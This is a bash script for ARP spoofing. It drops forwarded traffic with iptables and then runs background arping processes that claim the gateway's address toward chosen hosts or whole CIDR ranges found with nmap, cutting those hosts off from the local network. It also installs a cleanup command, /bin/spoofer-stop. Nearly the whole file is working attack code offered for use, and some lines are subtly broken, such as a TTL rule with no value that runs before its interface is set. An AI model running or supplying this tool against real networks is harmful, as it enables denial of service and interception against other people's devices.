#!/bin/bash

# Set iptables drop policy
iptables -P FORWARD DROP
iptables -I FORWARD -j DROP

# Block hops by setting TTL to 0
iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 2>/dev/null

# Enable ip forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Function to auto-detect interface
auto_detect_interface() {
    # Get the default route interface
    local interface=$(ip route | grep default | head -1 | awk '{print $5}' | head -1)

    if [[ -n "$interface" ]]; then
        echo "$interface"
    else
        # Fallback: get first non-loopback interface
        interface=$(ip link show | awk -F': ' '/^[0-9]+: [^lo]/ {print $2; exit}')
        echo "$interface"
    fi
}

# Function to auto-detect gateway
auto_detect_gateway() {
    # Get the default gateway
    local gateway=$(ip route | grep default | head -1 | awk '{print $3}')

    if [[ -z "$gateway" ]]; then
        # Fallback method
        gateway=$(route -n | grep '^0.0.0.0' | awk '{print $2}' | head -1)
    fi

    echo "$gateway"
}

# Function to get device IP
get_device_ip() {
    local interface=$1
    local device_ip=$(ip addr show "$interface" | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | head -1)
    echo "$device_ip"
}

# Function to process targets (handle single IP, multiple IPs, CIDR)
process_targets() {
    local targets_input=$1
    local gateway=$2
    local device_ip=$3

    local target_list=()

    # Split input by spaces
    IFS=' ' read -ra TARGETS <<< "$targets_input"

    for target in "${TARGETS[@]}"; do
        # Check if it's a CIDR range
        if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
            echo "Expanding CIDR range: $target"
            # For CIDR, try to get all IPs in the network
            if command -v nmap &> /dev/null; then
                local cidr_ips=$(nmap -sn "$target" 2>/dev/null | grep report | awk '{print $NF}' 2>/dev/null)
                if [[ -n "$cidr_ips" ]]; then
                    while IFS= read -r ip; do
                        # Skip gateway and device IP
                        if [[ "$ip" != "$gateway" ]] && [[ "$ip" != "$device_ip" ]] && [[ -n "$ip" ]]; then
                            target_list+=("$ip")
                        fi
                    done <<< "$cidr_ips"
                else
                    # Fallback: add base IP if nmap fails
                    local base_ip=$(echo "$target" | cut -d'/' -f1)
                    if [[ "$base_ip" != "$gateway" ]] && [[ "$base_ip" != "$device_ip" ]]; then
                        target_list+=("$base_ip")
                    fi
                fi
            else
                # If no nmap, just add the base IP
                local base_ip=$(echo "$target" | cut -d'/' -f1)
                if [[ "$base_ip" != "$gateway" ]] && [[ "$base_ip" != "$device_ip" ]]; then
                    target_list+=("$base_ip")
                fi
                echo "Warning: nmap not found, using base IP only for CIDR: $target"
            fi
        else
            # Single IP or multiple space-separated IPs
            # Validate IP format
            if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                # Skip gateway and device IP
                if [[ "$target" != "$gateway" ]] && [[ "$target" != "$device_ip" ]]; then
                    target_list+=("$target")
                fi
            fi
        fi
    done

    # Return unique targets
    if [[ ${#target_list[@]} -gt 0 ]]; then
        printf '%s\n' "${target_list[@]}" | sort -u
    fi
}

echo " "
# Get interface
read -rp "Enter network interface (or press Enter to auto-detect): " INTERFACE
if [[ -z "$INTERFACE" ]]; then
    INTERFACE=$(auto_detect_interface)
    echo "Auto-detected interface: $INTERFACE"
fi

# Validate interface
if ! ip link show "$INTERFACE" &> /dev/null; then
    echo "Error: Interface '$INTERFACE' not found!"
    exit 1
fi

# Get device IP
DEVICE_IP=$(get_device_ip "$INTERFACE")
echo "Auto-detected device IP: $DEVICE_IP"

# Get gateway
read -rp "Enter gateway IP (or press Enter to auto-detect): " GATEWAY
if [[ -z "$GATEWAY" ]]; then
    GATEWAY=$(auto_detect_gateway)
    echo "Auto-detected gateway: $GATEWAY"
fi

# Validate gateway format (allow empty gateway for auto-detection edge cases)
if [[ -n "$GATEWAY" ]] && [[ ! "$GATEWAY" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid gateway format!"
    exit 1
fi

# Get targets
echo " "
echo "Enter target(s):"
echo "  - Single IP: 192.168.1.100"
echo "  - Multiple IPs: 192.168.1.100 192.168.1.101 192.168.1.102"
echo "  - CIDR range: 192.168.1.0/24"
echo "  - Mixed: 192.168.1.100 192.168.1.0/24 192.168.1.101"
read -rp "Target(s): " TARGETS_INPUT

if [[ -z "$TARGETS_INPUT" ]]; then
    echo "Error: Target(s) required!"
    exit 1
fi

# Process targets
echo "Processing targets..."
PROCESSED_TARGETS=$(process_targets "$TARGETS_INPUT" "$GATEWAY" "$DEVICE_IP")

if [[ -z "$PROCESSED_TARGETS" ]]; then
    echo "Error: No valid targets found!"
    exit 1
fi

echo
echo "Configuration:"
echo "  Interface:  $INTERFACE"
echo "  Device IP:  $DEVICE_IP"
echo "  Gateway:    $GATEWAY"
echo "  Targets:"
while IFS= read -r target; do
    echo "    - $target"
done <<< "$PROCESSED_TARGETS"
echo

# Create cleanup script
cat > /bin/spoofer-stop << EOF
#!/bin/bash

# Reset forwarding policy
iptables -P FORWARD ACCEPT
iptables -F FORWARD

# Kill arping processes
pkill -f arping

# Remove hop blocking
iptables -t mangle -D PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0 2>/dev/null

echo "Spoofer cleanup complete"
EOF
chmod 755 /bin/spoofer-stop

    # Store PIDs for cleanup
    pids=()

    # Loop through each target and perform ARP spoofing
    while IFS= read -r target; do
        if [[ -n "$target" ]]; then
            echo " "
            echo "Blocking the target IP: $target"
          ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
            pid1=$!
            pids+=($pid1 )
        fi
    done <<< "$PROCESSED_TARGETS"

# cleanup
echo " "
echo "Spoofer is running in the background!"
echo "To stop, run: sudo spoofer-stop"
